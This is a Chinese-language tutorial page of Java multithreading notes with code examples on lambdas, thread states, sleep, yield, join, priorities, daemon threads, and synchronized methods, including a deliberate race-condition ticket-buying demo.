<h4 id="1-2、Lamda表达式">1.7.1.2. 1.2、Lamda表达式</h4><h5 id="1-2-1、函数式接口">1.7.1.2.1. 1.2.1、函数式接口</h5><p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221108220523994.png" alt="image-20221108220523994"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> src.Thread.TestThread04;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">推导lambda表达式</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestLambda</span> &#123;</span><br><span class="line">    <span class="comment">// 3、静态内部类</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Like2</span> <span class="keyword">implements</span> <span class="title class_">ILike</span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">lambda</span><span class="params">()</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;I like lambda2&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 正常写</span></span><br><span class="line">        <span class="type">Like</span> <span class="variable">like</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Like</span>();</span><br><span class="line">        like.lambda();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Like2</span>().lambda();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4、局部内部类</span></span><br><span class="line">        <span class="keyword">class</span> <span class="title class_">Like3</span> <span class="keyword">implements</span> <span class="title class_">ILike</span>&#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">lambda</span><span class="params">()</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;I like lambda3&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Like3</span>().lambda();</span><br><span class="line">        <span class="comment">// 5、匿名内部类,没有类的名称,必须借助接口或者父类</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ILike</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">lambda</span><span class="params">()</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;I like lambda4&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 6、用lambda简化</span></span><br><span class="line">        <span class="comment">//like = ()-&gt;&#123;System.out.println(&quot;I like lambda5&quot;);&#125;;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 1、定义一个函数式接口</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">ILike</span>&#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">lambda</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2、实现类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Like</span> <span class="keyword">implements</span> <span class="title class_">ILike</span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">lambda</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;I like lambda&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221109212012612.png" alt="image-20221109212012612"></p>
<h4 id="1-3、静态代理">1.7.1.3. 1.3、静态代理</h4><ul>
<li>真实对象和代理对象要实现同一个接口</li>
</ul>
<h4 id="1-4、线程停止">1.7.1.4. 1.4、线程停止</h4><ul>
<li><p>线程状态，getState()</p>
</li>
<li><p>死亡之后的线程不能再次启动</p>
<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221109212155980.png" alt="image-20221109212155980"></p>
<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221109212549582.png" alt="image-20221109212549582"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> src.Thread.ThreadStatus;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 观察测试线程的状态</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestState</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">thread</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(()-&gt;&#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Thread.sleep(<span class="number">1000</span>); <span class="comment">// Waiting</span></span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(<span class="string">&quot;=============&quot;</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="comment">// 观察状态</span></span><br><span class="line">        System.out.println(thread.getState()); <span class="comment">// New</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 观察启动后</span></span><br><span class="line">        thread.start(); <span class="comment">// 启动线程</span></span><br><span class="line">        System.out.println(thread.getState()); <span class="comment">// Run</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(thread.getState() != Thread.State.TERMINATED)&#123;</span><br><span class="line">            Thread.sleep(<span class="number">100</span>);</span><br><span class="line">            System.out.println(thread.getState());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221110205045246.png" alt="image-20221110205045246"></p>
<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221110205054732.png" alt="image-20221110205054732"></p>
</li>
<li><p>线程方法</p>
<table>
<thead>
<tr>
<th align="center">方法</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">setPriority(int newPriority)</td>
<td align="center">更改线程的优先级</td>
</tr>
<tr>
<td align="center">static void sleep(long millis)</td>
<td align="center">在指定的毫秒数内让给当前正在执行的线程休眠</td>
</tr>
<tr>
<td align="center">void join()</td>
<td align="center">等待该线程终止</td>
</tr>
<tr>
<td align="center">static void yield()</td>
<td align="center">暂停当前正在执行的线程对象，并执行其他线程</td>
</tr>
<tr>
<td align="center">void interrupt()</td>
<td align="center">中断线程，别用这个方式</td>
</tr>
<tr>
<td align="center">boolean isAlive()</td>
<td align="center">测试线程是否处于活动状态</td>
</tr>
</tbody></table>
</li>
<li><p><input disabled type="checkbox"> 
建议使用一个标志位进行终止变量，当flag&#x3D;false时，则终止线程运行</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> src.Thread.ThreadStatus;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试stop</span></span><br><span class="line"><span class="comment">// 1、建议线程正常停止---&gt;利用次数，不建议死循环</span></span><br><span class="line"><span class="comment">// 2、建议使用标志位---&gt;设置一个标志位</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">stop</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span>&#123;</span><br><span class="line">    <span class="comment">// 1、设置一个标志位</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(flag)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;run...thread&quot;</span> + i++);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 2、设置一个公共的方法停止线程，转换标志位</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">stop1</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.flag = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">stop</span> <span class="variable">stop</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">stop</span>();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(stop).start();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;main...thread&quot;</span>+i);</span><br><span class="line">            <span class="keyword">if</span> (i==<span class="number">900</span>)&#123;</span><br><span class="line">                <span class="comment">// 调用stop1方法切换标志位，让线程停止</span></span><br><span class="line">                stop.stop1();</span><br><span class="line">                System.out.println(<span class="string">&quot;线程停止了&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221109220133837.png" alt="image-20221109220133837"></p>
<h4 id="1-5、线程休眠（sleep）">1.7.1.5. 1.5、线程休眠（sleep）</h4><ul>
<li>sleep(时间)指定当前线程阻塞的毫秒数</li>
<li>sleep存在异常InterruptedException</li>
<li>每个对象都有一个锁，sleep不会释放锁</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> src.Thread.ThreadStatus;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 模拟延时：放大问题的发生性</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 模拟倒计时</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestSleep</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">tenDown</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">            System.out.println(num--);</span><br><span class="line">            Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">            <span class="keyword">if</span>(num&lt;=<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        tenDown();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221110194617933.png" alt="image-20221110194617933"></p>
<h4 id="1-6、线程礼让（yield）">1.7.1.6. 1.6、线程礼让（yield）</h4><ul>
<li>礼让线程，让当前执行的线程暂停，但不阻塞</li>
<li>将线程从运行状态转为就绪状态</li>
<li>让CPU重新调度，礼让不一定成功</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> src.Thread.ThreadStatus;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试礼让线程</span></span><br><span class="line"><span class="comment">// 礼让不一定成功</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestYield</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">MyYield</span> <span class="variable">myYield</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyYield</span>();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(myYield,<span class="string">&quot;线程1&quot;</span>).start();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(myYield,<span class="string">&quot;线程2&quot;</span>).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyYield</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(Thread.currentThread().getName()+<span class="string">&quot;线程开始执行&quot;</span>);</span><br><span class="line">        Thread.yield();</span><br><span class="line">        System.out.println(Thread.currentThread().getName()+<span class="string">&quot;线程停止执行&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221110195554295.png" alt="image-20221110195554295"></p>
<h4 id="1-7、线程强制执行（join）">1.7.1.7. 1.7、线程强制执行（join）</h4><ul>
<li>Join合并线程，<strong>待此线程执行完成后，再执行其他线程，其他线程阻塞</strong>（&#x3D;&#x3D;插队）（少用）</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> src.Thread.ThreadStatus;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试join方法==》插队</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestJoin</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;线程VIP来了&quot;</span>+i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="type">TestJoin</span> <span class="variable">testJoin</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TestJoin</span>();</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">thread</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(testJoin);</span><br><span class="line">        thread.start();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">200</span>; i++) &#123;</span><br><span class="line">            <span class="comment">// 当主线程执行到50时，让vip来先执行完</span></span><br><span class="line">            <span class="keyword">if</span>(i==<span class="number">50</span>)&#123;</span><br><span class="line">                thread.join();</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(<span class="string">&quot;main&quot;</span>+i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221110201131462.png" alt="image-20221110201131462"></p>
<h4 id="1-8、线程的优先级">1.7.1.8. 1.8、线程的优先级</h4><p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221110205428853.png" alt="image-20221110205428853"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> src.Thread.ThreadStatus;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试一下线程的优先级</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestPriority</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">MyPriority</span> <span class="variable">myPriority</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyPriority</span>();</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(myPriority);</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(myPriority);</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(myPriority);</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t4</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(myPriority);</span><br><span class="line">        t1.start();</span><br><span class="line">        t2.setPriority(<span class="number">2</span>);</span><br><span class="line">        t2.start();</span><br><span class="line">        t3.setPriority(<span class="number">1</span>);</span><br><span class="line">        t3.start();</span><br><span class="line">        t4.setPriority(<span class="number">10</span>);</span><br><span class="line">        t4.start();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyPriority</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(Thread.currentThread().getName()+<span class="string">&quot;--&gt;&quot;</span>+Thread.currentThread().getPriority());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="1-9、守护线程（daemon）">1.7.1.9. 1.9、守护线程（daemon）</h4><ul>
<li>线程分为<strong>用户线程</strong>和<strong>守护线程</strong></li>
<li>虚拟机必须确保用户线程（main）执行完毕</li>
<li>虚拟机不用等待守护线程（gc）执行完毕</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> src.Thread.ThreadStatus;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试守护线程</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestDaemon</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">God</span> <span class="variable">god</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">God</span>();</span><br><span class="line">        <span class="type">You</span> <span class="variable">you</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">You</span>();</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">thread</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(god);</span><br><span class="line">        thread.setDaemon(<span class="literal">true</span>); <span class="comment">// 默认是false表示是用户线程，正常都是用户线程，除非加setDaemon</span></span><br><span class="line">        thread.start();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(you).start(); <span class="comment">// 用户线程启动</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果不是守护线程则，则被调用会一直执行</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">God</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;上帝保佑着你&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">You</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">36500</span>; i++) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;你一生都开心的活着&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;goodbye world!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221110212705724.png" alt="image-20221110212705724"></p>
<h4 id="1-10、线程同步机制">1.7.1.10. 1.10、线程同步机制</h4><ul>
<li>线程同步—-多个线程操作同一个资源	</li>
<li>并发—-同一个对象被多个线程同时操作</li>
<li>队列+锁—-解决线程安全性问题</li>
</ul>
<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221110223137463.png" alt="image-20221110223137463"></p>
<h5 id="1-10-1、不安全的线程–模拟买票">1.7.1.10.1. 1.10.1、不安全的线程–模拟买票</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> src.Thread.syn;</span><br><span class="line"><span class="comment">// 不安全买票</span></span><br><span class="line"><span class="comment">// 线程不安全，有同票以及负数</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UnsafeBuyTicket</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">BuyTicket</span> <span class="variable">buyTicket</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BuyTicket</span>();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(buyTicket,<span class="string">&quot;小红&quot;</span>).start();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(buyTicket,<span class="string">&quot;小王&quot;</span>).start();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(buyTicket,<span class="string">&quot;小张&quot;</span>).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BuyTicket</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">ticketNums</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 买票</span></span><br><span class="line">        <span class="keyword">while</span> (flag)&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                buy();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">buy</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="comment">// 判断是否有票</span></span><br><span class="line">        <span class="keyword">if</span> (ticketNums&lt;=<span class="number">0</span>)&#123;</span><br><span class="line">            flag = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 模拟延时</span></span><br><span class="line">        Thread.sleep(<span class="number">100</span>);</span><br><span class="line">        System.out.println(Thread.currentThread().getName() + <span class="string">&quot;拿到了第&quot;</span> + ticketNums-- + <span class="string">&quot;张票&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221111134544129.png" alt="image-20221111134544129"></p>
<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221111134606754.png" alt="image-20221111134606754"></p>
<h5 id="1-10-2、同步方法及同步块">1.7.1.10.2. 1.10.2、同步方法及同步块</h5><p>synchrinized方法和synchrinized块</p>
<p><strong>特性&#x3D;&#x3D;&gt;会先线程变得安全,但会降低效率</strong></p>
<ul>
<li><input disabled type="checkbox"> 同步方法：</li>
</ul>
<p><code>public synchronized void method(int args)&#123;&#125;</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> src.Thread.syn;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UnsafeBuyTicket</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">BuyTicket</span> <span class="variable">buyTicket</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BuyTicket</span>();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(buyTicket,<span class="string">&quot;小红&quot;</span>).start();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(buyTicket,<span class="string">&quot;小王&quot;</span>).start();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(buyTicket,<span class="string">&quot;小张&quot;</span>).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BuyTicket</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">ticketNums</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 买票</span></span><br><span class="line">        <span class="keyword">while</span> (flag)&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 延时位置要改到run方法中</span></span><br><span class="line">                Thread.sleep(<span class="number">100</span>);</span><br><span class="line">                buy();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 加上synchronized变成同步方法，锁的是对象本身</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">buy</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="comment">// 判断是否有票</span></span><br><span class="line">        <span class="keyword">if</span> (ticketNums&lt;=<span class="number">0</span>)&#123;</span><br><span class="line">            flag = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(Thread.currentThread().getName() + <span class="string">&quot;拿到了第&quot;</span> + ticketNums-- + <span class="string">&quot;张票&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p><input disabled type="checkbox"> 
同步块:</p>
<p><code>synchronized(obj)&#123;&#125;</code></p>
</li>
</ul>
<p>1.11、CopyOnWriteArrayList</p>
